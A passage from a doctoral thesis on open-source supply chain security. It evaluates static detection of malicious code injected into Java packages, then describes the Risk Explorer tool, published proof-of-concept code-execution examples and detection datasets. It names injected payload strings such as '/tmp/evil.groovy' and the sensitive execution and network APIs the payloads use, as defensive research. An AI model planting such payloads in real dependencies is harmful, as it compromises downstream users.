Except for the **LC** case, which retains 2 of the 3 strings added by P2, the recall value is low for P2 and P3. This is because strings such as `addURL` (cf. Listing 8.2) or `/tmp/evil.groovy` (cf. Listing 8.3) have a low Shannon entropy and thus are filtered out. Nevertheless, the malicious URLs added by P2 and P3 are always kept allowing the detection of these injections. 

Finally, searching for sensitive keywords in different formats (cf. Section 8.2) proves to be an effective technique for detecting malicious strings and further improves the performances of the filters shown in Table 8.3. For example, **SH** _C_ **+LC** combined with the search of sensitive keywords keeps unchanged the recall for this filter, reduces the initial 

140 

_8.3. Experiment_ 

number of strings by 99.8%, and improves accuracy (i.e., 99.9% for P1, 66.4% for P2, and 74.8% for P3). 

## **Sensitive APIs** 

**==> picture [454 x 230] intentionally omitted <==**

Figure 8.4 – Detection of sensitive APIs for `mockito-core@4.6.1` . 

In this part of the analysis, we evaluate to what extent the detection of sensitive APIs may be an indicator of malicious JARs. To do so we scan the list of instructions within all the methods of each class file. For each category of API (cf. Section 8.2) we report the signature of the detected API and the names of the class and method containing it. 

Figure 8.4 shows, for instance, the results of the scan for the four versions of `mockito-core` (i.e., the original and the three infected versions). In total, we detect 68 calls to sensitive APIs in the original version. The version infected with P1 differs from the original one because of the presence of an execution API (i.e., `exec` from the Runtime library). The version containing P2 shows additional API calls related to networking and dynamic programming, while the P3 version shows additional APIs related to networking and file output. In Fig. 8.4 the presence of an execution-related API is an outlier compared to the original version. However, execution APIs are legitimately used by other packages we considered (e.g., h2database). 

We can conclude that depending on the type of library under consideration, there may be greater or lesser use of APIs related to a specific category. This affects the extent to 

141 

Chapter 8 – _Contribution 5 - Evaluation of Static Approach to the Detection of Malicious Packages in Java_ 

which the presence of a method call related to a category is discriminant for malicious code detection. Still, in Fig. 8.4, the API calls used by the infections P2 and P3 could be overlooked among the legitimate calls to APIs of the same categories. 

## **Empty Catch Clauses** 

In this case, we evaluate how the detection of empty catch clauses (when payloads use such a feature) for the detection of malicious JARs. 

For each method contained in a class, we report the name of the class and method that contains the empty catch, and the instructions belonging to the corresponding try block. We also report the detected sensitive APIs and the appearance of suspicious strings from the constant pool. 

Table 8.4 reports the average results for all the infected packages. In both cases of P1 and P3 the malicious insertion is detected (P2 is not characterized by an empty catch). Reporting try blocks that contain sensitive APIs ( **T+API** ) reduces on average the number of blocks to be reviewed by 86%. Adding the search for suspicious strings (after the **SH** _C_ **+LC** filter) in the associated try block ( **T+API+S** ) reduces the blocks to be reviewed by 97.6% for P1 and 97.4% for P3. For both P1 and P3, the malicious insertion is detected (i.e., recall value of 1.0). 

We can conclude that the detection of empty catch clauses coupled with the detection of sensitive APIs and suspicious strings turns out to be a valid approach for the detection of malicious code. The final number of items to be reviewed is small and relevant. 

|**Type**<br>P1<br>P2_∗_<br>P3|**T+API**<br>**rf**<br>**P**<br>**R**<br>85.9%<br>0.153<br>1.0<br>87.45%<br>n.a.<br>n.a.<br>85.7%<br>0.178<br>1.0|**T+API+S**<br>**rf**<br>**P**<br>**R**|
|---|---|---|
|||97.6%<br>.850<br>1.0<br>99.97%<br>n.a.<br>n.a.<br>97.4%<br>.950<br>1.0|



– Table 8.4 Average results for the empty-catch analysis. We report the reduction factor ( **rf** ), precision ( **P** ), and recall ( **R** ) of the filters based on considering try blocks containing sensitive API call(s) ( **T+API** ) and the further check of suspicious strings ( **T+API+S** ). ( _[∗]_ ): analysis not applicable to the P2 case. 

142 

_8.3. Experiment_ 

## **Intra-Procedural Data Flow Analysis** 

As described in Section 8.2, for each of the detected sensitive APIs we perform an intra-procedural data-flow analysis to find their input values. We then check whether they are also among the suspicious strings. 

The data-flow analysis used is always able to report the type of the input, whereas its value is provided only when the method contains a string. 

Table 8.5 reports average results for all infected packages. Considering the cases for which data-flow analysis succeeds in finding the actual value of the input (cf. column **DFA** ), we reduce the results to be inspected by 73.7% for P1, 75.5% for P2, and 73.1% for P3. By comparing the detected input values with the suspicious strings, we further reduce the information to be reviewed for all three infected versions (still containing the malicious additions, as shown by the unchanged recall values). Compared to the empty catch clause analysis, the data-flow analysis reduces less the information but has the benefit of covering also cases where malicious payloads are not associated with empty catch clauses. 

|**Type**<br>P1<br>P2<br>P3|**DFA**<br>**rf**<br>**P**<br>**R**<br>73.7%<br>.195<br>1.0<br>75.5%<br>.195<br>.333<br>73.1%<br>.264<br>1.0|**DFA+S**<br>**rf**<br>**P**<br>**R**|
|---|---|---|
|||94.6%<br>.600<br>1.0<br>94.4%<br>.617<br>.333<br>94.7%<br>.617<br>1.0|



– Table 8.5 Average results for data-flow analysis. We report the reduction factor ( **rf** ), precision ( **P** ), and recall ( **R** ) for the filters for which the data-flow analysis detects the actual input value ( **DFA** ) and for those that have input strings that are among the suspicious ones ( **DFA+S** ). 

143 

Chapter 8 – _Contribution 5 - Evaluation of Static Approach to the Detection of Malicious Packages in Java_ 

## **Response to RQ5.2** 

Through the described experiment we assessed how the indicators considered in RQ5.1 perform in the detection of malicious Java bytecode. **Constant Pool** : The Shannon entropy values of the strings compared at the class level performs better than the ones compared at the JAR level since for the latter we observed more removals of malicious strings. Language detection performs better than relative entropy measurement (with English characters), as the latter does not work in cases where injected strings are composed of English words. **Bytecode Instructions** : Looking for sensitive APIs and suspicious strings in try blocks associated with empty catch clauses reduces irrelevant information without removing malicious additions. Searching for suspicious strings among input values to sensitive APIs found by data-flow analysis is helpful in detecting malicious behavior. 

## **8.4 Limitations** 

The problem of deciding whether a program is malicious is undecidable because of its relation to the Halting problem [233]. For Chess and White’s looser detection model thus we have to accept false positives [233]. 

We evaluate different indicators for the static analysis of Java bytecode to detect malicious code. Therefore our methodology inherits the limitations of static approaches [234]. In addition, our analysis has been based on the malwares falling into the categories described in Table 8.1. Other types of malicious code changes, e.g., insertion of hidden credentials or removal of security checks, are out of our scope. Moreover, in spite of our best effort in building an extensive list of sensitive Java APIs, our approach does not cover attacks carried out using different API calls. 

As for data-flow analysis, our approach is limited to cases where the malicious payload and the API using it are in the same method (intra-procedural analysis): more complex cases where the attacker spread different parts of the payload in multiple places are out of our current scope. 

Finally, Shannon entropy is low for short strings and for strings with a short alphabet (e.g., binary strings, base16). An attacker could then challenge our detection by breaking the payload into shorter strings or using respective encodings. 

144 

_8.5. Conclusion_ 

## **8.5 Conclusion** 

To detect malicious code following attacks on the OSS supply chain within the Java ecosystem, we have introduced a static analysis method that focuses on the constant pool and JVM bytecode instructions. 

In the context of the constant pool, we assessed various filtering techniques aimed at reducing the volume of elements requiring review during the analysis of malicious code. Our findings reveal that a filter based on selecting the third quartile of the classlevel Shannon entropy of strings, combined with language detection, effectively decreases the occurrence of false positives while retaining relevant information. Additionally, the incorporation of checks for sensitive keywords among the remaining strings serves to further highlight instances of malicious insertions. 

Regarding bytecode instructions, our approach involves the detection of sensitive API calls across the entire set of instructions, as well as within try blocks associated with empty catch clauses. Subsequently, we conduct intra-procedural analysis on these findings. This method, too, contributes to the reduction of false positives and the identification of malicious additions. 

145 

Chapter 9 

## **INDUSTRIAL IMPACT** 

This chapter outlines the practical contributions of our research, which have been woven into the fabric of the open-source community and are aimed at addressing the challenges described in Chapter 1, Section 1.3. These contributions serve as practical tools and resources that can be readily utilized by researchers, developers, and practitioners in the field. 

In the following sections, each of these contributions will be discussed in detail, providing insights into their development, application, and potential impact on the broader field. 

## **9.1 Risk Explorer for Software Supply Chains** 

As emphasized in the Introduction (cf. Chapter 1), the issue of attacks on the software supply chain, including the open-source software supply chain, is critically significant for both national and enterprise security. Open-source software development involves a spectrum of contributors, ranging from structured organizations to individual coders. With this in mind, when developing the taxonomy (cf. Chapter 4) and the mapping of safeguards (cf. Chapter 5), our aim was to help elucidate the risks that come with the use of third-party components and provide practical guidelines. Our hope is that this could contribute towards heightened user awareness and fortify the overall security of the software supply chain. 

To make this knowledge accessible to all, including non-academic audiences, we developed a tool called _Risk Explorer for Software Supply Chains_ . This tool is open-source[1] and is designed to streamline the use, adoption, and expansion of the taxonomy outlined in Chapter 4. This aim is similar to other community-driven efforts, e.g., Common Weakness Enumeration (CWE)[2] . The _Risk Explorer for Software Supply Chains_ includes all related 

> 1. `https://github.com/SAP/risk-explorer-for-software-supply-chains` 

> 2. `https://cwe.mitre.org` 

147 

Chapter 9 – _Industrial Impact_ 

information such as mitigating safeguards (as per Chapter 5) and a comprehensive list of references. The tool is tailored to serve both the open-source and security communities, helping facilitate their engagement with this resource. 

The tool has been developed using React.js[3] , a front-end framework for single-page applications, and is hosted by a Node.js server. As such, it can be served via GitHub Pages, and the iterative exploration of the attack tree happens in the browser. 

The interactive visualization of the attack tree is the tool’s main functionality and has been implemented using the _collapsible tree_ from the d3.js library[4] . Users can collapse and expand the different nodes of the attack tree to explore the attack surface of open-sourcebased software development. The description of the respective attack vector, references, as well as associated safeguards are shown below the tree (cf. Figure 9.1). This exploratory mode of visualization offers to the user the benefit of managing visual complexity and accessing information in more consumable portions on-demand [235]. 

A share button generates a deep link to individual attack vectors, which can be referenced from 3rd party websites, e.g., in training material or security advisories. A search field in the top-right corner allows searching for attack vectors by name. Upon selection, the respective path from the root node to the selected attack vector is expanded and highlighted in red. The second search field right below is for safeguards. Upon selection, all the nodes mitigated by the respective safeguard are colored in green (cf. Figure 9.1). All attack vectors, safeguards, and bibliographical references can also be displayed in tabular form. References can be sorted after title, publication year and affected ecosystem. The tabular display of attack vectors also allows showing information about associated safeguards in a modal window. 

**==> picture [455 x 95] intentionally omitted <==**

– Figure 9.1 Screenshot of the attack tree visualization (in green attack vectors covered by safeguard _Reproducible builds_ ) [2]. 

3. `https://reactjs.org/` 

4. `https://d3js.org/` 

148 

_9.1. Risk Explorer for Software Supply Chains_ 

## **9.1.1 Industrial Use Cases** 

The Risk Explorer tool can support the following industrial activities. 

## **Training and Awareness.** 

The Risk Explorer tool enables an interactive visualization of the taxonomy, the description of attack vectors and safeguards, and the dataset of resources reviewed during the systematization of knowledge. Thus, it can be used to better understand security risks in software supply chains and raise awareness among developers and security practitioners. 

For example, let us assume that we heard about the attack to the _event-stream_ package [26]. To figure out which attack vector was used, we can search for such package in the Risk Explorer through the tabular view of references (cf., Fig. 9.2). In the column _Related Attack vectors_ we find which attack vector is assigned to. We can then click on the deep link to locate such attack within the taxonomy. At this point, the risk explorer provides the description of the specific attack vector used to infect the _event-stream_ package, other attacks that used the same strategy, and mitigating safeguards that would protect against this attack. Looking at the path from the specific attack vector up to the root node, we can learn about the chain of goals that led to the supply chain attack. By stopping at a certain depth of the taxonomy we can learn about what other possibilities attackers could have used and more generic safeguards that would protect against a broader spectrum of attacks. 

A security expert at SAP used the tool when providing guidance on supply chain security across the entire organization. She reported that, through the suggested safeguards and linked references, the tool _"helped learning more about preventive and detective measures"_ . Content, but especially the combination of features offered by the tool, e.g. _"the visualization and mapping, [and the] ability to see cross-references"_ , was reported as a strength. The expert concluded that she _"will continue to reference to this research while improving security practices for development"_ . 

## **Threat Modeling.** 

During this activity, the goal is to outline the threats to which a system is (potentially) subjected and then identify possible countermeasures that can be put in place to protect against those threats. 

149 

Chapter 9 – _Industrial Impact_ 

**==> picture [455 x 243] intentionally omitted <==**

– Figure 9.2 Page containing the tabular view of all the references categorized. They can be sorted by title, year of publication, related attack vectors, related safeguards, and by type. 

By presenting an extensive list of attack vectors, the tool can support threat modeling activities in the context of OSS supply chain attacks. In particular, once the architectural diagram of the infrastructure is outlined, one can identify to which threats (i.e., attack vectors) the actors and systems may be subject to. Moreover, the cross-reference to the related countermeasures helps in understanding how to protect the infrastructure from those threats. 

## **Scope red-team activities.** 

Red-teaming activities consist of simulating real-world attack scenarios to evaluate the security capability of a system. 

Similarly to the ATT&CK Navigator[5] , the tool can also be used for red/blue team activities planning and security assessments. The enumeration of attack vectors (child nodes) according to different goals (parent nodes) provides a check-list of possible strategies to be adopted (as an attacker) during the security assessment of a project. 

> 5. `https://mitre-attack.github.io/attack-navigator/` 

150 

_9.1. Risk Explorer for Software Supply Chains_ 

## **Gap analysis of safeguards.** 

The visual highlight of attack vectors covered by given safeguards through the safeguards searchbar (cf. Fig. 9.1) can help in the gap-analysis, thus to evaluate which attack vectors are being mitigated by the safeguards in place and which, if any, would need to be implemented. 

## **9.1.2 Adding a new attack reference: the case of PyTorch-nightly.** 

**==> picture [228 x 143] intentionally omitted <==**

**----- Start of picture text -----**<br>
torchtriton<br>Public Repository 1st Priority<br>(PyPI)<br>Build System<br>PyTorch-nightly<br>2nd Priority<br>torchtriton<br>PyTorch’s Private<br>Repository<br>**----- End of picture text -----**<br>


Figure 9.3 – Highlight of the attack vector used in the PyTorch-nightly compromise within the taxonomy. 

Let us assume that we learn about a new attack and we want to contribute by assigning it to the appropriate attack vector within the tree. We consider as an example the recent PyTorch-nightly’s compromise (December 25th-30th, 2022). 

The security advisory states that _"a malicious dependency package (torchtriton) [...] was uploaded to the Python Package Index (PyPI) code repository with the same package name as the one we ship on the PyTorch nightly package index. Since the PyPI index takes precedence, this malicious package was being installed instead of the version from our official repository"_ [236]. The attack is depicted in Figure 9.3. 

To assign the attack to a node of the taxonomy, we need to navigate it from the root node, establishing which path to follow when moving to deeper nodes. From the root node, the first question we ask ourselves is whether the attack consists of developing a malicious package from scratch, exploiting a name similar to that of a legitimate project, or whether a legitimate package has been subverted. Since `torchtriton` is a legitimate dependency used by PyTorch-nightly, we fall in the last case. From the node _Subvert Legitimate Package_ (AV-001), we need to discriminate whether the attack occurred via 

151 

Chapter 9 – _Industrial Impact_ 

the VCS, build system or the distribution platform. In the compromise of `torchtriton` , neither the source code nor the build infrastructure were compromised, the attack occurred in the PyPI package repository and thus we fall in the last node _Distribute Malicious Version of Legitimate Package_ (AV-500). By reading the security advisory, the root cause of the attack was caused by the fact that `torchtriton` was only present in the PyTorch nightly package index (used to build the PyTorch-nightly project) and not in the public PyPI repository. Thus, the legitimate dependency `torchtriton` was _masked_ by _abusing the dependency resolution mechanism_ (AV-509). The PyTorch-nightly’s compromise can thus be assigned to node (AV-509) (cf. Fig. 9.4). 

Whenever an attack exploits new ways of injecting malicious code, it may happen that the existing vectors may not covering the newly identified behavior. In such cases an extension of the taxonomy itself has to be considered. 

**==> picture [455 x 177] intentionally omitted <==**

Figure 9.4 – Highlight of the attack vector used in the PyTorch-nightly compromise within the taxonomy. 

## **9.1.3 How To Contribute** 

The tool and its underlying data are hosted on GitHub[6] . The flat data structures in separate files facilitate the addition and update of information. To this end, the repository also contains a template for references, which is supposedly the most frequent addition, e.g., to reflect new attacks or scientific publications. When Pull Requests are merged, a new version of the page is automatically deployed. 

6. `https://github.com/SAP/risk-explorer-for-software-supply-chains` 

152 

_9.2. Open-Source Contributions_ 

## **9.2 Open-Source Contributions** 

In this section, we delineate the open-source projects we have created to share the technical details and artifacts developed during the course of our research. First, as a result of the contributions described in Chapter 6, we provide the open-source community with runnable examples illustrating various ACE techniques, aiding practical understanding of these techniques and their applications. Second, in the context of the contributions presented in Chapter 7, we have open-sourced the training dataset, the best-performing models used in our real-world experiment, the list of identified malicious packages, and the scripts necessary to replicate and verify our results. This aims to enhance transparency and reproducibility in research, providing other researchers and practitioners with the opportunity to validate, learn from, and build upon our work. 

## **9.2.1 Risk Explorer - Execution Proof-of-Concepts** 

As part of the practical contributions for the research described in Chapter 6, we developed an open-source project, named _Risk Explorer - Execution Proof-of-Concepts_[7] , in which we distinctly illustrate how third-party dependencies can lead to ACE and thereby conduct open-source software supply chain attacks across multiple ecosystems. This is achieved through providing executable examples that detail the mechanism in which these dependencies can actuate execution in downstream projects. 

Generally, third-party dependencies can trigger ACE during two significant stages of their lifecycle. First, during installation when downstream users or projects incorporate a third-party dependency through popular package managers, e.g., npm, Composer, pip. Second, during runtime, which involves the actual use and invocation of the thirdparty dependency’s code. The project expands across several programming languages and their respective package managers. The programming languages covered in the project with their corresponding reference package managers are the following: Python (pip), JavaScript (npm), Ruby (gem), PHP (composer), Rust (cargo), Go (go), Java (mvn). 

The primary goal of this project is to support researchers by providing practical examples for developing preventive methodology against ACE-induced threats. Moreover, it offers a valuable resource for penetration testers assessing whether the offensive techniques outlined in our work could potentially be replicated within their respective organizations. 

> 7. `https://github.com/SAP-samples/risk-explorer-execution-pocs` 

153 

Chapter 9 – _Industrial Impact_ 

The project has a defined structure, which replicates the structure of the techniques described in Chapter 6, Section 6.2: 

- The `install-time` directory holds examples demonstrating how to achieve ACE during the third-party dependency installation. Each subfolder contains executable examples for different programming languages (i.e., Python, JavaScript, Ruby, PHP, Rust), thereby advocating the different practices. 

- The `runtime` directory highlights examples showcasing how to achieve ACE during the runtime of the third-party dependency. Similar to its install-time counterpart, it’s also divided into subfolders illustrating examples for different techniques. Each subfolder contains executable examples for all covered programming languages. 

## **9.2.2 Cross-language Detection Artifacts and Malwares Report** 

In the context of the contributions presented in Chapter 7, we have open-sourced the training dataset, the best-performing models used in our real-world experiment, the list of identified malicious packages, and the scripts necessary to replicate and verify our results. This aims to enhance transparency and reproducibility in research, providing other researchers and practitioners with the opportunity to validate, learn from, and build upon our work. 

- In particular, the project repository[8] is composed of the following artifacts: 

- The file `Labelled_Dataset.csv` serves as the primary data repository for our analysis process. It encompasses the dataset used for multiple aspects such as model evaluation, feature analysis, and classifier training. Researchers can leverage this dataset to explore the selection of features, evaluate the performance of existing models, and understand the training process for the classifiers more efficiently. 

- We have also provided three files in `.pkl` format - `cross-language.pkl` , `JavaScript _mono-language.pkl` , and `Python_mono-language.pkl` . These files encapsulate the optimally performing classifiers derived from our analysis. Saved in Python’s pickle format, they can be easily imported using the scikit-learn library, making them valuable for future classification task executions. 

- `Malicious_Packages_Discovered.csv` constitutes the catalogue of malicious packages that were successfully detected in our real-world experiment. This files presents further details about detected packages, including their behavioural types and ob- 

8. `https://github.com/SAP-samples/cross-language-detection-artifacts` 

154 

_9.2. Open-Source Contributions_ 

fuscation techniques evident in them. 

- Lastly, the `scripts` directory contains the scripts that were instrumental in reproducing the evaluation and training of models mentioned in the academic paper. These scripts provide the means of replicating our study, validating our research findings, and fostering further research on the subject matter. 

It is also worth mentioning that during our real-world analysis (cf. Chapter 7, Section 7.3), involving 31,292 packages, we discovered 58 previously unidentified malicious packages on npm and PyPI. These malwares were promptly reported to the respective repositories, and we also contributed to BKC[9] by uploading them. The removal of these malwares played a crucial role in protecting users from potential infections. The disclosed samples now stand as valuable resources for the broader research community. 

> 9. Commit `6d7d140168f80c048fc1622a4788b1f5c17af2d0` 

155 

Chapter 10 

## **CONCLUSIONS AND PERSPECTIVES** 

In this thesis, we have explored the multifaceted landscape of OSS supply chain security, recognizing the pivotal role of software modularization and the intricate dependencies within the open-source ecosystem. The fundamental practice of software modularization has significantly propelled software development, fostering reusability and productivity. OSS, as a cornerstone in modern development, presents both advantages and challenges, particularly in the context of supply chain security. 

This chapter concludes the thesis, presenting a summary of the primary findings. It also discusses the challenges encountered during the research of OSS supply chain attacks. Lastly, the chapter outlines prospective future directions and perspectives in this research area. 

## **10.1 Key Results** 

This thesis has sought to address the pressing issue of software supply chain attacks, particularly within the context of OSS. The complexity and sheer volume of code present in this domain necessitates a multi-pronged approach to effectively mitigate such attacks. This approach comprised of a detailed understanding of the OSS supply chain attacks, including the creation of a comprehensive taxonomy of these attacks, the mapping of existing safeguards to related attack vectors, and the investigation into how third-party dependencies can achieve ACE on downstream systems. Additionally, the thesis pursued the development of automated methods for the detection of malicious behavior in thirdparty dependencies, which resulted in the evaluation of machine learning-based and static approaches to detect malicious packages in JavaScript, Python, and Java. 

The creation of a taxonomy of OSS supply chain attacks was a novel contribution that filled a gap in both academia and industry, providing a comprehensive, technologyagnostic description of these attacks. A subsequent mapping of safeguards to attack vectors used this taxonomy to outline potential mitigation strategies against these attack 

157 

vectors. Together, these contributions resulted in a conference paper [1] and a magazine article [3], and the creation of an open-source tool, the _Risk Explorer for Software Supply Chains_ (presented also in a demo paper [2]). 

The investigation into how third-party dependencies achieve ACE on downstream systems represented another novel contribution, leading to a workshop paper [4] and open-sourced runnable examples demonstrating the various ACE techniques identified in the different ecosystems under analysis. 

The automated prevention of OSS supply chain attacks was addressed through the evaluation of a machine learning-based approach to detect malicious packages in JavaScript and Python (cf. Chapter 7) and a static approach in Java (cf. Chapter 8). The machine learning approach showed promise for cross-language detection, leading to the successful detection and reporting of 58 previously unknown malware instances. The results of this contribution are presented in a conference paper [5] and have been made verifiable and reproducible, with the open-sourcing of related artifacts, including the training dataset, best-performing models, identified malicious packages, and scripts necessary to replicate the results. The static approach was based on the analysis of JVM bytectode to highlight indicators of malicious behaviors, and its significance was empirically evaluated. The results of this preliminary evaluation have been presented in a workshop paper [6]. 

In conclusion, this thesis has made novel contributions to our understanding of OSS supply chain attacks and our ability to prevent them, particularly through automated methods for the detection of malicious packages. However, the attack surface in this domain remains broad and complex, and there is still much work to be done. As we continue to rely on OSS, it is of paramount importance to further our efforts in securing these supply chains. The work presented in this thesis represents a step forward in this ongoing endeavor. The challenges we have encountered and the insights we have gained can provide future research directions in this critical area of cybersecurity. 

## **10.2 Reflections on Software Supply Chain Security Research** 

The realm of software supply chain security proves to be complex due to its inherently large attack surface. Its complexity is compounded by the numerous systems involved, each responsible for maintaining the integrity of the software being produced - from the VCS and build system to the repositories hosting pre-compiled versions of software prod- 

158 

ucts. Moreover, various stakeholders with different roles and privileges also act within this context, thereby, intensifying its intricacies. The multifaceted, socio-technical nature of the software supply chain therefore introduces additional challenges, transcending technological boundaries and extending to management and user interaction matters. Such complex domain provides a plethora of research opportunities. In our endeavor to propose a comprehensive taxonomy, a key motivation has been to break down the vast problem into smaller, more manageable research-oriented issues. 

To create the taxonomy, one of the main challenges we faced was the lack of a historically comprehensive, community-recognized database of scientific and non-scientific resources related to attacks on the OSS supply chain. These resources are a fundamental prerequisite for creating a taxonomy. As our aim was to describe an exhaustive taxonomy of attacks on the OSS supply chain, this problem necessitated an enormous effort on our part in collecting, reviewing, and cataloging these resources. We aspire that this gathered collection can grow and be improved in the future by the entire community to preserve and enhance the quality of the taxonomy itself, as well as to keep it up to date. 

A noteworthy initiative focused on the collection and archival of software is Software Heritage[1] . Given the growing interest in software traceability (e.g., SBOM), this project presents numerous opportunities. The availability of historical software data also opens avenues for analyzing the evolution of cyber attacks and their occurrence. For instance, in the event of a legitimate project being compromised with the injection of malicious code, it becomes possible to explore methods for prevention and mitigation through differential analysis. Having the entire source code history accessible allows for in-depth investigations into strategies aimed at thwarting such attacks. 

One of the main challenges faced during our research in the context of the detection of malicious packages, was the limited availability of malicious samples. It is a standard practice of package repositories to completely remove and render inaccessible to the community any reported malware. This is undoubtedly beneficial as it prevents downstream users from accidentally downloading them. However, it would also be advantageous to grant researchers access, albeit with suitable safety measures in place. At present, the main dataset accessible to researchers is BKC [60]. While this dataset comprises a substantial number of malware examples (approximately 3,000 samples), it relies on voluntary contributions. Notably, we have observed a significant variance in the number of known malwares reported in technical reports. For instance, in the _9th State of the Software Sup-_ 

> 1. `https://www.softwareheritage.org/` 

159 

_ply Chain Report_ [237], Sonatype reported logging more than 240,000 malicious packages since 2019. However, these packages are not open to the public. Sharing malicious examples with research communities can provide valuable information: technical details on the implementation of malicious behaviors, understanding dominant malicious behaviors, observing the evolution of attacks over time (e.g, how attacker are increasing complexity in their attacks), identifying obfuscation techniques used, and so on. This can not only help users protect against known malware (just as users can identify known vulnerabilities with CVEs) but also support the development and proposal of increasingly sophisticated detection solutions. Given that the malware detection problem is undecidable [233], it is vital for protection purposes that the entire community share information about it. In this context, Software Heritage could consider a proactive approach, such as archiving removed malicious packages from their respective repositories and granting researchers access to this data for analysis and study 

AI-based approaches for the detection of malicious packages are more and more popular. Inspite of encouraging results, such approaches, and in particular those based on supervised learning, face a fundamental limitation: the resulting models learn from the known examples and they naturally do not generalize well to malicious examples of different nature, mutations, or more sophisticated implementations. Moreover, both our experience described in Section 7.3 (Chapter 7) and the analysis by Ohm et al. [27] reveal that most known malicious examples (identified by BKC) are relatively simple in nature (e.g., unobscured malicious code, malicious code often found in install-scripts). 

The detection of binary malware has been an active research area for years. Compared to traditional malware analysis [238], detecting malicious packages as done in this thesis does not focus solely on binaries (e.g., PE or ELF executables), but encompass the case where malicious code may be present in any part of openly visible source code. On the one hand, it is clear that malware analysis (understood as understanding the behavior) on source code can be simpler (not requiring the reverse engineering phase). However, detecting the actual portion of the code (often hidden in a large part of benign code) is a complex problem. Though methods proposed for the detection of malicious binaries should be evaluated also in the context of malicious code detection, it is important to further explore both similarities and differences of the two reseach efforts. 

160 

## **10.3 Future Works and Perspectives** 

We discuss now the possible future research prospects in the field of OSS supply chain security. 

Starting from the results obtained in understanding attacks on the OSS supply chain, first and foremost, the active maintenance of the taxonomy (and of the _Risk Explorer for Software Supply Chains_ ) and ongoing collection of references about emerging threats and new types of attack is important. This is crucial to keep our knowledge about the attack vectors used by the attackers relevant and up-to-date. In this context, one of the possible future tasks could be to automate the crawling, analysis, and classification of references related to attack vectors. 

Moreover, the _Risk Explorer for Software Supply Chains_ presented in this thesis could be made even more effective by adding the possibility to reflect the results of automated or manual assessments done for a given development project, in order to highlight open and covered attack vectors, similar to what the Atomic Red Team tool[2] does for the ATT&CK framework. 

To enhance the security of the OSS supply chain, a desirable research direction pertains to the context of mitigation measures. It is important to expand the collection of countermeasures presented in Chapter 5, especially considering the growing attention on software supply chain security [18], [85], [239] and the proposed frameworks and standards [44], [54], [240]. Therefore, it is necessary to have a detailed and up-to-date catalog of the various countermeasures, and to conduct an assessment of their usefulness and cost (as shown in Chapter 5) at least qualitatively. By identifying the priority safeguards (which, for example, show high utility), academia can research innovative ways to reduce their costs. For instance, as highlighted in Chapter 5 (Section 5.3), the _reproducible build_ safeguard is identified by many experts as highly useful. At the same time, its implementation still requires high costs and efforts, and thus the desired large-scale adoption of this good practice is still limited. Therefore, we hope that as research progresses in this field, a solution like _reproducible build_ can lower its costs to become more easily adoptable by the entire community. 

In the context of software supply chain security, SBOMs are gaining popularity and special attention (especially due to the push from regulatory agencies [241]) as a means to provide a complete view of a software component’s composition. The use cases enabled 

> 2. `https://github.com/redcanaryco/atomic-red-team` 

161 

by SBOMs align with software supply chain management and SCA in general. Despite this, several studies have expressed skepticism about the maturity of SBOMs and the assessment of their quality [242], [243]. Balliu et al. [243] showed that the generation of SBOMs is still an open research problem with various challenges and current tools still lack accuracy in the detection of dependencies. The problem becomes even more complex when considering dependencies imported at runtime or so-called _phantom artifacts_ [244]. Moreover, current standards (e.g., CycloneDX, SPDX) still require improvements to include information facilitating a truly useful analysis of vulnerability exposure. In our view, it would be beneficial to also consider the issue of malicious dependencies in the design of SBOM standards. This could entail cataloging, for example, whether dependencies contain calls to security-sensitive APIs, or include potentially dangerous practices (e.g., use of install scripts). 

The area of malicious package detection also offers several research directions. 

Firstly, in line with the objectives of the work presented in Chapter 6, it would be appropriate to conduct an empirical study on different package repositories to analyze the prevalence of the various techniques explained in Section 6.2 among different packages (including benign ones). This would be useful in understanding how much detecting the analyzed techniques can aid in the detection of malicious packages. 

Following that, analogous to understanding how third-party components perform ACE, another research dimension is to understand which APIs are potentially dangerous for different programming languages (e.g., as done for Java in Chapter 8). As databases of malicious samples (e.g., BKC) grow, it is conceivable to automatically identify the APIs commonly used by malicious packages (e.g., shell command invocation, methods for opening network connections). Based on this information, it could be possible to construct rules or heuristics for large-scale detection using static approaches (e.g., constructing YARA, semgrep, or CodeQL rules) or use them as features for supervised machine-learning approaches. 

Building on the work done in Chapter 7, further machine-learning-based methods for cross-language detection can be explored, as shown by Zhang [73], for example. It is interesting to test these approaches in yet unexplored ecosystems (e.g., PHP, Ruby) that share similar features with npm and PyPI (e.g., the ability to execute code at install time, as shown in Chapter 6, Section 6.2). 

Furthermore, with the advent of generative AI and Large Language Models (LLMs), it is intriguing to explore the possibility of generating mutations of malicious code for 

162 

fine-tuning or benchmarking detection approaches. 

Finally, it is worth making a final consideration regarding the centrality of package managers and package repositories. Although downstream users can always consume the source code of dependencies and compile it themselves, the most common practice is to rely on package managers and consume pre-built components. For this reason, package managers and their associated package repositories turn out to be crucial elements to safeguard against attacks on the OSS supply chain. Therefore, the knowledge acquired in recent years about the security of the OSS supply chain, along with understanding the characteristics of attacks on the OSS supply chain, should guide a redesign of package managers and package repositories to make them more secure by design. A starting point could be systematizing knowledge about different package managers (for example, as initiated by the OWASP packman project[3] ). Subsequently, it will be necessary to define the "dos and don’ts", as well as the functional and non-functional requirements for a secure by design architecture. In this direction, worthy projects to be considered include sigstore[4] , TUF[5] , and in-toto[6] . 

> 3. `https://github.com/OWASP/packman` 

> 4. `https://www.sigstore.dev/` 

> 5. `https://theupdateframework.io/` 

> 6. `https://in-toto.io/` 

163 

## **BIBLIOGRAPHY** 

- [1] P. Ladisa, H. Plate, M. Martinez, and O. Barais, « Sok: taxonomy of attacks on open-source software supply chains », in _2023 IEEE Symposium on Security and Privacy (SP)_ , Los Alamitos, CA, USA: IEEE Computer Society, May 2023, pp. 1509–1526. doi: `10.1109/SP46215.2023.00010` . [Online]. Available: `https: //doi.ieeecomputersociety.org/10.1109/SP46215.2023.00010` . 

- [2] P. Ladisa, H. Plate, M. Martinez, O. Barais, and S. E. Ponta, « Risk explorer for software supply chains: understanding the attack surface of open-source based software development », in _Proceedings of the 2022 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses_ , ser. SCORED’22, Los Angeles, CA, USA: Association for Computing Machinery, 2022, pp. 35–36, isbn: 9781450398855. doi: `10 . 1145 / 3560835 . 3564546` . [Online]. Available: `https : //doi.org/10.1145/3560835.3564546` . 

- [3] P. Ladisa, S. E. Ponta, A. Sabetta, M. Martinez, and O. Barais, « Journey to the center of software supply chain attacks », _IEEE Security & Privacy_ , 2023. doi: `10.1109/MSEC.2023.3302066` . 

